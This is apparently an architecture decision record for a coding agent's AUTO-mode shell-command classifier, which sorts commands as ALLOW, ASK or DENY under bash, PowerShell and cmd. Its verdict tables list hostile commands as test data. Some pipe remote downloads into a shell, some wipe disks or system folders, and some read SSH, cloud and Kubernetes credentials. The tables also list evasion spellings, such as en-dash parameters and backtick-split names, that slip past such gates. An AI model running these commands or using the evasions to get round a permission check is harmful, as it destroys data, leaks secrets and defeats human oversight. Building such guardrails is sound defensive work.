# 0237. A dialect owns its switch syntax, and the gate read every shell with bash's

Status: Accepted (2026-09-04).
Date: 2026-09-04
Supersedes/relates: ADR-0158 (the tree-sitter-bash AUTO-mode classifier this is
the sister of, and whose `Verdict` order and strictest-wins composition it
inherits unchanged; the `_READ_ONLY_ONLY_WHEN_BARE` narrowing that ADR's
follow-up commit `0be16cd` added is **replaced** here),
ADR-0157 (the `auto` posture whose decision this verdict is),
ADR-0004 (`GuardrailExtension` — the regex first-block-wins floor, retained
beneath all of this and relaxed by nothing here),
ADR-0235 (Pi is a reference, not a target — Pi has no command classifier of any
kind, so nothing here is a divergence to justify).
Issue: #204 (this ADR), #110 (the AUTO posture epic it closes a leg of).
Design spec: `.omc/specs/204-design-2026-09-04.md`.

AUTO mode read every command with a bash grammar and then ran it in whatever
shell `_resolve_shell` returned. On Windows that is PowerShell or `cmd`. The
gate's answer and the shell's behaviour were two unrelated facts about the same
string, and #104 papered over the gap by downgrading ALLOW to ASK whenever the
resolved shell was not one the bash grammar describes. That is sound, and it is
why nothing was ever mis-run. It also means AUTO mode on Windows prompts for
every command, which is indistinguishable from not shipping it there.

This ADR is not primarily about Windows. Validating #204's fifth acceptance
criterion turned up **six commands that AUTO mode auto-runs today, on the
owner's own machine, and that write files or set the system clock.** They are
all in the function `0be16cd` added to prevent exactly that.

## What was actually broken, measured on darwin against `main` c6d424c

`uv run python -c "from aelix_coding_agent.builtin.bash_classifier import classify; ..."`
in `/tmp/wt-204`:

```
ALLOW  'sort -o out.txt in.txt'        <- writes out.txt
ALLOW  'sort -oout.txt in.txt'         <- writes out.txt (GNU attached-value short form)
ALLOW  'sort --output=out.txt in.txt'  <- writes out.txt
ALLOW  'sort --output out.txt in.txt'  <- writes out.txt
ALLOW  'date --set=2030-01-01'         <- sets the system clock (GNU coreutils)
ALLOW  'hostname -b'                   <- --boot: sets the hostname
ASK    'date -s 2030-01-01'            <- ASKs by ACCIDENT: the value is a separate positional
ASK    'sort -o /etc/passwd in.txt'    <- ASKs by ACCIDENT: /etc/passwd is the /-leading token
ASK    'sort /etc/hosts'               <- a plain read, refused
```

`_classify_bare_only_read_only` (`bash_classifier.py:438-460`) rests on two
premises, and both are false on POSIX:

- *a `-`-leading token is a read-only flag* — used for `date` and `hostname`.
  GNU `date --set=`, `date -s`, `hostname -b`, `hostname -F` all write.
- *only a `/`-leading token writes* — used for `sort`. GNU `sort -o` writes and
  leads with `-`.

So `0be16cd` narrowed the wrong axis. It paid a real POSIX read (`sort
/etc/hosts`) to catch a cmd switch, while leaving the POSIX write switch of the
same command wide open. #204's criterion 5 — recover `sort /etc/hosts` — is
therefore not a precision-only concession. It is the same edit.

## Decision

**A dialect owns its switch syntax, and the ALLOW tier reads arguments with
that dialect's syntax. A name is ALLOW only when every argument is a token this
dialect's grammar says is read-only.**

Not "`/o` is never a real path" — a heuristic about how paths tend to look —
but "under POSIX a `/`-leading token is *never a switch*, the read-only
switches of `sort` are `-n -u -k -t …`, and the write switches are `-o` and
`--output`". A fact about each dialect's grammar, testable, and it yields both
of #204's contested cases from one rule:

| dialect | `sort /etc/hosts` | `sort -n in.txt` | `sort -o out.txt` | `sort in.txt /o out.txt` |
| ------- | ----------------- | ---------------- | ----------------- | ------------------------ |
| POSIX      | **ALLOW** (crit. 5) | ALLOW | ASK (bug fixed) | ALLOW¹ |
| POWERSHELL | ALLOW              | ALLOW | ASK             | ASK    |
| CMD        | ASK²               | ASK   | ASK             | **ASK** (crit. 2) |
| UNKNOWN    | ASK                | ALLOW | ASK             | **ASK** (crit. 2) |

¹ Under a real POSIX shell `/o` is a nonexistent input path and `sort` errors.
Harmless, and the honest answer.
² `/etc/hosts` is a `/e…` switch cluster to cmd's `sort`, and cmd's `sort` has
no `/E`. Unknown switch → ASK.

The ALLOW tier is an **allowlist of read-only switches**, not a denylist of
write switches. "Never ALLOW an argument we did not read" is the only form that
survives GNU's attached-value short options (`-oout.txt`) and `--flag=value`.
`UNKNOWN` refuses any token that is a write switch under *any* dialect and
accepts a token that is read-only under *at least one* and dangerous under
none — which is what keeps all eight of criterion 2's pinned assertions
byte-identical (verified against `tests/builtin/test_bash_classifier.py:44-51`,
which is `:43-50` on `main` c6d424c — the block moved one line when the test
module gained its `Dialect` import).

Four dialects, selected from the shell `_resolve_shell` actually returned:

- **POSIX** — `bash sh dash ksh mksh zsh`. The existing bash grammar, arguments
  now read as POSIX switches.
- **POWERSHELL** — `pwsh powershell`. A new `tree-sitter-powershell` walk.
  Its POSIX-binary switch tables are the **union** with POSIX, because `pwsh`
  is a shipping shell on macOS and Linux where `sort`, `rm`, `ls`, `cat` and
  `ps` are the real binaries and not aliases.
- **CMD** — `cmd command`. A new hand-written conservative tokenizer.
- **UNKNOWN** — `fish`, and anything unrecognised or unresolvable. The bash
  grammar, every dialect's write switches refused at once, ALLOW still gated by
  `is_classifiable_shell`.

`classify(command, *, dialect=Dialect.UNKNOWN)` — the default is UNKNOWN, not
POSIX. A POSIX default reads `sort in.txt /o out.txt`'s `/o` as a path and
returns ALLOW, which is exactly the fail-open shape criterion 2 forbids and
which would require rewriting the pinned assertions to keep them "passing".
UNKNOWN means "I do not know which shell will run this", which is both the
truth at that call site and ADR-0158's strictest-wins rule stated as a default
value.

`_CLASSIFIABLE_SHELLS` is untouched. No Windows shell is added to it and
`is_classifiable_shell` keeps its exact meaning — "the *bash* grammar describes
this shell" — because that is a claim about a grammar, not about a platform
(#204 criterion 1).

## Grammar strategy: tree-sitter for PowerShell, a tokenizer for cmd

The split is the decision, not a compromise. The two dialects fail differently.

**PowerShell gets `tree-sitter-powershell` (0.26.4, Airbus CERT, MIT).**
Prebuilt `cp310-abi3` wheels for macOS x86_64/arm64, manylinux and musllinux
x86_64/aarch64, `win_amd64` and `win_arm64` — resolver-verified across 8
platform × Python-version combinations, all "Would install 1 package". It loads
under the repository's existing `tree-sitter>=0.25,<0.26` pin at ABI 15, so no
pin moves.

The measurement that settles it against a hand-written tokenizer:
`[System.Diagnostics.Process]::Start('calc')` parses cleanly with **zero
command nodes**. A tokenizer scanning for a leading verb-noun finds nothing
there and has nothing to fail safe *on*. The AST hands us a node type —
`invokation_expression`, `type_literal` — to refuse. The same probe found `$x`
alone: `has_error=False`, zero commands. `max`'s identity is ALLOW, so a naive
fold over an empty command list auto-runs every expression-only line. Both are
pinned as tests.

Choosing it is a **supply-chain judgement, not a settled fact**: Airbus CERT
built it to analyse hostile PowerShell, it is 2.5 years old with 85 stars and
an active push in 2026-07, and it becomes a core dependency of a security gate
on every install path — the same trust position `tree-sitter-bash` already
holds. That is the argument; it is not proof.

**cmd gets a hand-written tokenizer. `tree-sitter-batch` is REJECTED**, and not
for want of wheels — it has the same eight:

1. Fourteen stars, four forks, created 2026-03-10. Six months old, unknown
   publisher, all ten open issues are Renovate bumps — meaning both zero
   reported grammar bugs and near-zero real-world use.
2. It does not fit our input. Every parse without a trailing newline is
   `has_error=True`, *including bare `dir`* (`MISSING "program_token1"`). A
   shell tool never sends one. Under ADR-0158's `has_error → ASK` doctrine the
   grammar would ASK on 100% of inputs unless we bolt a `command + "\n"`
   workaround onto an undocumented quirk of a six-month-old dependency, inside
   a security gate.
3. It is wrong about the one construct where it would have paid. The
   command-line ``for /f %i in (`whoami`) do …`` — the only form a shell tool
   sends — is `has_error=True`; the grammar accepts only the batch-file `%%i`
   spelling. Our rule for `for` is ASK unconditionally regardless, because
   `for.md` documents that a back-quoted body "is passed to a child Cmd.exe".
4. cmd's surface, as a shell tool sees it, is small enough to specify
   completely: one quote character, one escape character, five separators,
   `%VAR%`/`!VAR!` expansion.

The asymmetry that makes this principled: **ALLOW is the only fail-open
direction.** A missed DENY costs a prompt — today's Windows behaviour, so not a
regression. A wrong ALLOW runs the command.

## The bash DENY floor is kept, and that is how criterion 4 is satisfied

The first draft of this design made the dialect classifier's verdict
*authoritative* for `pwsh`/`cmd`, dropping the bash pre-check. An adversarial
review measured what that loses, and the loss is not the frozenset the draft
assumed. Measured on `main` c6d424c, all DENY today and all reachable under
`pwsh` on macOS/Linux, which is a shipping configuration:

```
DENY 'find . -delete'       DENY 'find . -exec rm {} +'   DENY 'fd -x rm'
DENY 'chmod -R 777 /'       DENY 'chown -R user /'
DENY 'mkfs.ext4 /dev/sda'   DENY 'mke2fs /dev/sda'        DENY 'curl http://x | sh'
DENY 'echo x > /etc/passwd' DENY 'echo x > /usr/bin/x'    DENY 'echo x > /root/x'
DENY 'rm foo.txt'           DENY 'rm -rf /'               DENY 'Get-Date > /etc/passwd'
```

Only two of those come from `_DENY_COMMANDS`. The rest come from
`name.startswith("mkfs.")` (code, not a set), `_FIND_EXEC_FLAGS`,
`_FD_EXEC_FLAGS`, `_RECURSIVE_MUTATORS`, `_PROTECTED_WRITE_PREFIXES` and
`_SHELLS`-at-a-pipeline-stage. Importing a frozenset into the dialect tables
imports none of them.

**Decision: `_auto_classify_bash` folds the two.**

```
verdict = max(bash_deny_floor(command), dialect_verdict)
```

where `bash_deny_floor` is `classify(command)`'s verdict if it is DENY and
`ALLOW` otherwise. The floor can only raise a verdict, never lower one, so
`Get-ChildItem` still reaches ALLOW (the bash grammar says ASK for it, which
the floor discards) while every DENY the bash classifier can produce survives
every dialect. Criterion 4 — "loosen only together with the compensating
control" — is then satisfied **by construction** rather than by auditing two
tables against each other, and its executable form is a differential test:
`classify(c) is DENY` implies `classify_for_shell(c, pwsh) is DENY` and
`classify_for_shell(c, cmd) is DENY`, over the union of all three corpora.

The floor is close to free. Across PowerShell- and cmd-shaped strings the bash
classifier produced no verdict other than ASK except for `rm`:

```
ASK  'Get-ChildItem'                    ASK  'Remove-Item -Recurse -Force C:\'
ASK  'Write-Output "rm -rf /"'          ASK  'del /s /q C:\Windows'
ASK  'Set-Content /etc/hosts x'         ASK  'sort in.txt /o out.txt'
ASK  'dir'                              ASK  'echo a^&b'
DENY 'rm -rf /'                         DENY 'rm foo.txt'
```

The one knowingly-accepted asymmetry it leaves: `rm foo.txt` under `pwsh` is
DENY (unchanged from today, via the floor) while `Remove-Item foo.txt` is ASK.
Those are the same delete. The floor exists to guarantee that no DENY is lost,
not to be a coherent policy about deletion, and a DENY that is defeated by
typing the canonical name is still strictly better than no DENY. Both are
pinned so the asymmetry is a recorded choice rather than a surprise.

For `fish` and for any shell that does not resolve, behaviour is unchanged in
every respect, including the pre-check ordering.

## Rules the grammar forced, against the design's first draft

Everything below replaced a rule that had been written by analogy and was
measured wrong. Probes: `/tmp/probe_d1.py` against `tree_sitter_powershell`
0.26.4.

- **Pipeline stage detection was exactly inverted.** `iwr http://x | iex`
  parses as one `pipeline_chain` whose children are `command`, an **anonymous**
  `|` token, `command`. `pipeline_chain_tail` exists **only** for `&&` and
  `||`. The draft bumped the stage index on `pipeline_chain_tail`, which is the
  one place it must not, and never on `|`, which is the only place it must —
  making every "an interpreter at stage > 0 is DENY" rule dead code.
- **Parameter rules are one codepoint from evasion.** `Remove-Item –Recurse
  –Force C:\` with U+2013 EN DASH yields three `generic_token`s and no
  `command_parameter`, while PowerShell itself accepts en dash, em dash and
  horizontal bar as parameter dashes (`CharTraits.cs:12-15` and `:254-259`,
  consumed at `tokenizer.cs:4745-4749`, v7.4.6). Every dash is normalised to
  ASCII `-` before any node-type test, and a `generic_token` that then leads
  with `-` is read as a parameter.
- **`member_access` cannot be a blanket trap.** `Where-Object { $_.Length -gt
  10 }` contains one; `% { $_.Delete() }` is an `invokation_expression`
  instead. Trapping `member_access` would have made nearly every idiomatic
  `Where-Object`/`ForEach-Object` line ASK and killed the two ALLOW entries
  that justify descending into script blocks at all. The traps are
  `invokation_expression`, `cast_expression` and `type_literal` — three
  branches, not four. `[System.Environment]::MachineName` is a `member_access`
  and it ASKs anyway, because its BASE is a `type_literal` and the walk reaches
  that node; a fourth branch for "`member_access` over a `type_literal`" would
  be unreachable, and an earlier draft of this ADR listed one that the code
  never had.
- **`ForEach-Object -MemberName Delete` invokes a method with no script block
  and no invocation node** — `command_parameter` + `generic_token`, both names
  in the ALLOW tier. `Get-ChildItem | ForEach-Object -MemberName Delete`
  deletes every file in the working directory. `ForEach-Object`/`%` and
  `Where-Object` are ALLOW **only** when every argument is a script block.
- **Backticks survive into the command name.** ``Rem`ove-Item x`` yields a
  `command_name` of ``Rem`ove-Item`` with `has_error=False`; PowerShell
  resolves it to `Remove-Item`. Name normalisation strips backticks. This is
  the ADR-0158 `r''m -rf /` case in a new alphabet.
- **Redirections live inside `command_elements`.** `Get-Date > C:\Windows\x`
  puts a `redirection` node among the command's own arguments. **Any
  redirection drops a statement out of the ALLOW tier in both new dialects** —
  DENY if the target resolves to a protected prefix, ASK otherwise. The same
  single rule covers `type nul>C:\Windows\…` on the cmd side, where the
  tokenizer lexes `>` `>>` `<` `|` `&` at character level with no whitespace
  requirement, because cmd needs none.

## The sensitive-read denylist, and why it is the one denylist here

Everything else in the ALLOW tier is an allowlist. `sensitive_read_target`
(`shell_classifiers/common.py`) is not, and cannot be: it guards the *targets*
of names that are already ALLOW, and the set of paths a read may legitimately
name is the whole disk. A denylist is the wrong shape and it is the only shape
available, so the failure mode has to be stated rather than designed away —
**a credential family nobody enumerated is auto-read**, and the cost of each
omission is a leak, not a prompt.

It has bitten twice already, once per shape:

- **Evasion of an entry that was there.** `type C:\Users\me\.ssh\*` — one
  wildcard, and neither the basename table nor the `~`-anchored prefix table
  saw it. Closed by matching `.ssh`/`.aws`/… as a run of path COMPONENTS
  anywhere in the target.
- **An entry that was never there.** `.kube/config`, `.azure/accessTokens.json`,
  gcloud's `credentials.db` (`%APPDATA%\gcloud` on Windows, `~/.config/gcloud`
  on POSIX), `.terraform.d/credentials.tfrc.json`, `.git-credentials`,
  `.env.local`, and `id_ecdsa`/`id_dsa`/`.pgpass` outside a `.ssh` directory —
  all measured ALLOW at the gate in BOTH new dialects while `main` c6d424c
  answered ASK for every Windows line, so all were ASK → ALLOW moves this
  branch introduced. Two of them, `credentials.db` and
  `credentials.tfrc.json`, missed only because `credentials` was matched as an
  exact basename rather than as a stem, one row below the `~/.aws/credentials`
  that was refused. Closed; pinned in `tests/builtin/test_shell_common.py` and
  in both dialect bucket tables.

Four tables, deliberately redundant, and the redundancy is the point: an exact
basename, a basename STEM, a `~`-anchored prefix, and a component run matched
anywhere. `.gitconfig` is deliberately NOT in them — it names a credential
helper, it does not hold the credential — and that exclusion is pinned too, so
the next reader does not have to guess whether it was an oversight.

## Verdict table the tests pin

Bash classifier on `main` c6d424c, then under this change. All "before"
values were measured, not assumed. The `shell` column is the shell
`_resolve_shell` returns, so these are the GATE's answers
(`_auto_classify_bash`), not `classify()`'s — the two differ for exactly one
row and an earlier draft of this table asserted the wrong one of them, which
is what footnote ¹ records.

| command | shell | before | after |
| ------- | ----- | ------ | ----- |
| `sort /etc/hosts` | bash | ASK | **ALLOW** (crit. 5) |
| `sort -o out.txt in.txt` | bash | **ALLOW** | **ASK** |
| `sort -oout.txt in.txt` | bash | **ALLOW** | **ASK** |
| `sort --output=out.txt in.txt` | bash | **ALLOW** | **ASK** |
| `sort --output out.txt in.txt` | bash | **ALLOW** | **ASK** |
| `sort --compress-program=/tmp/x in.txt` | bash | **ALLOW** | **ASK** (it execs) |
| `date --set=2030-01-01` | bash | **ALLOW** | **ASK** |
| `hostname -b` | bash | **ALLOW** | **ASK** |
| `sort in.txt` · `sort -n in.txt` · `sort -k2 in.txt` | bash | ALLOW | ALLOW |
| `date` · `date -u` · `date +%Y` · `date -Iseconds` | bash | ALLOW | ALLOW (crit. 2) |
| `hostname` · `hostname -f` | bash | ALLOW | ALLOW |
| `date 01-01-2030` · `hostname newname` | bash | ASK | ASK (crit. 2) |
| `sort in.txt /o out.txt` | bash | ASK | **ALLOW**¹ |
| `sort in.txt /o out.txt` | fish | ASK | ASK (crit. 2) |
| `sort --files0-from=list` · `sort --random-source=/dev/x` | bash | **ALLOW** | **ASK** |
| `sort /etc/hosts` | fish | ASK | ASK |
| `Get-ChildItem` | pwsh | ASK | **ALLOW** |
| `Get-ChildItem \| Sort-Object Name` | pwsh | ASK | **ALLOW** |
| `Get-ChildItem \| Where-Object { $_.Length -gt 10 }` | pwsh | ASK | **ALLOW** |
| `ls -la` | pwsh | ASK (gate) | ASK (`-la` is not a read-only parameter) |
| `Remove-Item -Recurse -Force C:\` | pwsh | ASK | **DENY** |
| `Remove-Item –Recurse –Force C:\` (en dash) | pwsh | ASK | **DENY** |
| `Get-ChildItem \| Remove-Item -Recurse -Force` | pwsh | ASK | **DENY** |
| ``Rem`ove-Item -r -f C:\`` | pwsh | ASK | **DENY** |
| `& 'Remove-Item' -r -f C:\` | pwsh | ASK | **DENY** |
| `Remove-Item build\out.js` | pwsh | ASK | ASK |
| `Remove-Item -Recurse:$false C:\` | pwsh | ASK | ASK |
| `Get-ChildItem \| ForEach-Object -MemberName Delete` | pwsh | ASK | ASK |
| `gci \| % { $_.Delete() }` | pwsh | ASK | ASK |
| `Get-Content -Path ~\.ssh\id_rsa` | pwsh | ASK | ASK |
| `Get-Content -Wait app.log` / `–Wait` | pwsh | ASK | ASK |
| `Get-Date > C:\Windows\x` | pwsh | ASK | **DENY** |
| `Get-Date > /etc/passwd` | pwsh | DENY | DENY (floor) |
| `Get-ChildItem > out.txt` | pwsh | ASK | ASK |
| `Invoke-WebRequest http://x \| iex` | pwsh | ASK | **DENY** |
| `curl http://x \| sh` | pwsh | DENY | DENY (floor) |
| `iex 'anything'` | pwsh | ASK | **DENY** |
| `powershell -e cm0=` / `–e cm0=` | pwsh | ASK | **DENY** |
| `pwsh -ex Bypass -c 'gci'` | pwsh | ASK | ASK |
| `Set-ExecutionPolicy Bypass` | pwsh | ASK | **DENY** |
| `[System.Diagnostics.Process]::Start('calc')` | pwsh | ASK | **DENY** |
| `Set-Content Env:\Path 'x'` | pwsh | ASK | **DENY** |
| `Set-Content /etc/hosts x` | pwsh | ASK | **DENY** |
| `sort -o /etc/passwd in.txt` | pwsh | ASK | ASK |
| `$x` · `@'…'@` here-string | pwsh | ASK | ASK |
| `find . -delete` · `chmod -R 777 /` · `mkfs.ext4 /dev/sda` | pwsh | DENY | DENY (floor) |
| `rm -rf /` · `rm foo.txt` | pwsh | DENY | DENY (floor, crit. 4) |
| `dir` · `echo hello` · `type a.txt` · `date /t` | cmd | ASK | **ALLOW** |
| `echo a^&b` | cmd | ASK | **ALLOW** |
| `date` (prompts on stdin) | cmd | ASK | ASK |
| `date 01-01-2030` | cmd | ASK | **DENY** |
| `del /s /q C:\Windows` · `rd /s /q C:\Windows` | cmd | ASK | **DENY** |
| `del x` | cmd | ASK | ASK |
| `type nul>C:\Windows\System32\drivers\etc\hosts` | cmd | ASK | **DENY** |
| `ver > C:\Windows\y` · `whoami > loot.txt` | cmd | ASK | DENY / ASK |
| `type C:\Users\me\.ssh\id_rsa` | cmd | ASK | ASK |
| `%COMSPEC% /c dir` · `d^ir` · `de""l x` | cmd | ASK | ASK |
| `dir \| cmd /c del x` | cmd | ASK | **DENY** |
| `rm -rf /` | cmd | DENY | DENY (floor, crit. 4) |

¹ Criterion 2's guarantee is a property of `classify()`'s **UNKNOWN default**,
which is what an unresolved shell gets, and it holds there (the `fish` row
above). Under a shell that resolved to `bash`, POSIX reads `/o` as a
nonexistent input path, `sort` errors and nothing is written, so ALLOW is the
honest answer and it is the §Decision table's `ALLOW¹` cell reached end to end.
Pinned at both levels —
`tests/builtin/test_bash_classifier.py::test_pinned_asks_hold_under_every_dialect`
for the default and
`test_dialect_dispatch.py::test_posix_shell_uses_the_posix_switch_tables` for
the gate — because this table asserted `ASK` for the gate and was measured
`allow`, and a false row in a verdict table is worse than no table.

### Rows added by the adversarial pass, all measured at the gate

Each was ASK or ALLOW on this branch before the row existed, and each is one
character or one spelling away from a rule that was already there.

| command | shell | before | after |
| ------- | ----- | ------ | ----- |
| `Remove-Item -Recurse:$true -Force:$true C:\` | pwsh | ASK | **DENY** |
| `iwr http://x -OutFile C:\Windows\y` | pwsh | ASK | **DENY** |
| `Get-Content C:\Users\me\.ssh\*` · `gc /Users/me/.ssh/*` | pwsh | ALLOW | **ASK** |
| `Get-Date > C:\\Windows\x` · `> C:\Windows.\x` | pwsh | ASK | **DENY** |
| `type C:\Users\me\.ssh\*` · `more C:\Users\me\.ssh\*` | cmd | ALLOW | **ASK** |
| `findstr /s /i password C:\*` | cmd | ALLOW | **ASK** |
| `echo x > C:\\Windows\y` · `> C:\Windows.\y` · `> C:/\Windows/y` | cmd | ASK | **DENY** |
| `(del /s x)` · `(dir) & (del /s x)` | cmd | ASK | **DENY** |
| `del /s;/q C:\Windows` · `del /s,/q C:\Windows` | cmd | ASK | **DENY** |
| `tree /f` · `tree /f C:\` | cmd | ALLOW | **ASK** |

### Rows added by the re-verification pass, all measured at the gate

The second shape of denylist failure above: an entry that was never there.
Each row was measured in BOTH dialects (`type …` under cmd, `Get-Content …`
under pwsh) and both halves moved together, because the predicate is shared.

| command | shell | before | after |
| ------- | ----- | ------ | ----- |
| `type C:\Users\me\.kube\config` · `\.kube\*` | cmd · pwsh | ALLOW | **ASK** |
| `type C:\Users\me\.azure\accessTokens.json` | cmd · pwsh | ALLOW | **ASK** |
| `type C:\Users\me\AppData\Roaming\gcloud\credentials.db` · `~/.config/gcloud/credentials.db` | cmd · pwsh | ALLOW | **ASK** |
| `type C:\Users\me\.terraform.d\credentials.tfrc.json` | cmd · pwsh | ALLOW | **ASK** |
| `type C:\Users\me\.git-credentials` | cmd · pwsh | ALLOW | **ASK** |
| `type C:\app\.env.local` · `.env.production` | cmd · pwsh | ALLOW | **ASK** |
| `type C:\Users\me\keys\id_ecdsa` · `id_dsa` · `~\.pgpass` | cmd · pwsh | ALLOW | **ASK** |
| `type C:\Users\me\.gitconfig` | cmd · pwsh | ALLOW | ALLOW (kept, on purpose) |

## Non-goals

- **Windows is not supported by this ADR, and `README.md:65` does not change.**
  Nobody has run a PowerShell command through AUTO on a real Windows box. The
  classifiers are covered by unit and integration tests that patch
  `_resolve_shell`'s *result*, so both sides execute on the Linux leg and on
  the gating `windows-latest` leg. That is suite coverage, not runtime
  verification, and claiming otherwise is the exact kind of premise this
  repository has had to retract before.
- **Not a complete PowerShell or cmd semantics.** The ALLOW tiers are closed
  allowlists that will be incomplete. Incompleteness costs prompts, which is
  the correct direction. There is no `Get-*` wildcard and there must not be:
  `Get-` is an approved verb any module — or the same command line, via
  `function Get-Foo {…}` — can define.
- **No environment variable, `%VAR%`, `!VAR!`, `$env:` or `~` expansion, ever.**
  The existing doctrine at `bash_classifier.py:194-196`. Any target containing
  one is ASK, never resolved.
- **No filesystem access.** 8.3 short names (`C:\PROGRA~1`) and UNC paths are
  ASK because resolving them requires touching the disk.
- **The sensitive-read denylist is not, and will never be, complete.** See the
  section above for the shape of the problem and for the two rounds of holes
  already closed. An unnamed credential family is auto-read, and that is a
  leak rather than a prompt — the one place in this ADR where being wrong is
  not safe. Adding a family is a one-line change plus a pinned row in
  `tests/builtin/test_shell_common.py`; not adding one is silent.
- **No POSIX sensitive-read gate.** `common.sensitive_read_target` is a control
  the two new dialects grew; the POSIX side has no equivalent, so
  `cat ~/.ssh/id_rsa` and `cat /etc/shadow` stay ALLOW under `bash` exactly as
  they were on `main` c6d424c (measured — `cat` is unconditional in
  `_READ_ONLY`). That asymmetry is a recorded choice, not an oversight: it is
  `cat`'s pre-existing shape, and closing it is a change to the bash ALLOW
  tier's doctrine that belongs in its own issue with its own evasion suite.
  It has a measured cost this branch pays and the verdict table above does not
  show, because the table carries only `sort /etc/hosts`: `sort /etc/shadow`
  and `sort /home/me/.aws/credentials` were ASK on `main` c6d424c and are ALLOW
  here — the criterion-5 `sort` row applied to a secret. The marginal
  capability is zero (`cat` on the same two files is ALLOW on both sides, so
  the contents were already reachable without a prompt), which is why it is
  recorded here rather than fixed here; but the table says every "before" was
  measured, and these two rows moved.
- **Not a `for`/`if` batch analyser.** Every cmd control-flow keyword is ASK
  unconditionally. `for.md` documents that a back-quoted `for /f` body "is
  passed to a child Cmd.exe"; there is no shape worth reasoning about.
- **Not parity with anything.** Pi has no classifier (ADR-0235).

## Open risks

- **`tree-sitter-powershell` reports `has_error` on ordinary input.**
  `$env:VAR\literal` concatenation (upstream #50) and `--flag=value` (#46) both
  error. Those reach the fail-safe ASK, so PowerShell will prompt more often
  than bash does. That is the correct verdict and a real UX cost, and it is
  also the strongest argument *for* the AST: a tokenizer would have
  mis-tokenised them silently instead of flagging them.
- **`tree-sitter-powershell` has no `win32` or `manylinux i686` wheel** — the
  same gap `tree-sitter-bash` already has. `_load_parser`'s fail-safe covers
  it: no grammar means ASK for everything.
- **`_auto_classify_bash` still calls `_resolve_shell` with no `shell_path`.**
  It matched the spawn site only because nothing wires `opts["shell_path"]`
  through `create_bash_tool`. That now matters more, not less: a wrong shell no
  longer picks a wrong *gate*, it picks a wrong *grammar*.
- **Parameter prefix matching over-matches on purpose.** PowerShell resolves
  any *unambiguous* prefix (`MergedCommandParameterMetadata.cs:469`, v7.4.6);
  the classifier does not know each cmdlet's parameter set, so it cannot prove
  unambiguity. A token is accepted only if it prefixes an allowlisted parameter
  **and** prefixes no capability-bearing one — so `-o` is ASK because it
  prefixes both `-OutBuffer` and `-OutVariable`. `-ex`/`-ep` are excluded from
  the `-EncodedCommand` rule by hand because `about_pwsh` assigns them to
  `-ExecutionPolicy`.
- **Alias meanings differ by version and platform and the tables collapse to
  the more dangerous one.** `sc` is `Set-Content` on 5.1 and `sc.exe` — the
  service controller — on 7; `rm`, `ls`, `sort`, `cat`, `ps` are aliases on
  Windows and the real POSIX binaries on PowerShell 7 for Linux. Collapsing is
  why `sc` can never be ALLOW under either reading, and why POWERSHELL takes
  the union of POSIX switch tables. Where it costs precision, the fix is a
  `(dialect, platform)` key, not a looser table.
- **Strictest-wins does not descend into a PowerShell `*_statement`.**
  `& { iex 'x' }`, `if ($true) { Remove-Item -Recurse -Force C:\ }` and
  `try { … } finally { iex 'x' }` are ASK, not DENY: `_walk` transposes the
  bash classifier's `_CONTROL_FLOW` rule and refuses the whole statement rather
  than folding its body. A subexpression DOES descend (`$(iex 'x')` is DENY), so
  the composition rule holds where it is claimed and the carve-out is here.
  Fail-safe in every measured case — the loss is precision, never permission.
- **ADR-0158's warning still stands**: do not extend an ALLOW table without
  re-running the full evasion suite.

## Consequences

- `tree-sitter-powershell>=0.26,<0.27` becomes a core dependency on every
  install path, as `tree-sitter-bash` already is. `uv.lock` moves with it.
  `tree-sitter-batch` does not, and the `pyproject.toml` comment records why so
  the next reader does not helpfully add it.
- AUTO mode is usable on PowerShell and `cmd` for read-only work for the first
  time. It stays EXPERIMENTAL for the reason in Non-goals.
- **Six POSIX auto-allowed mutations stop being auto-allowed** (`sort -o` in
  four spellings, `date --set`, `hostname -b`), plus `sort --compress-program`,
  which executes an arbitrary program, plus `sort --files0-from` and
  `sort --random-source`, which each turn one argument into an unbounded set of
  reads. User-visible; in the CHANGELOG under Unreleased/Changed.
- `sort /etc/hosts` is auto-allowed again under a resolved POSIX shell. The
  cost `0be16cd` knowingly paid is recovered, and the doctrine it paid it under
  — strictest-wins when the dialect is unknown — is unchanged, because UNKNOWN
  is still what an unresolved shell gets.
- Two existing tests change and the changes are the point, not collateral:
  `test_powershell_removal_is_not_silently_allowed` flips from "prompts" to
  "blocked outright" (its name stays true; the verdict got stronger), and
  `citations.lock.json` moves because `bash_classifier.py` gains a module-scope
  import above the cited `:83-95` block.
- The regex Guardrail remains the first-block-wins floor. Nothing here relaxes
  it.
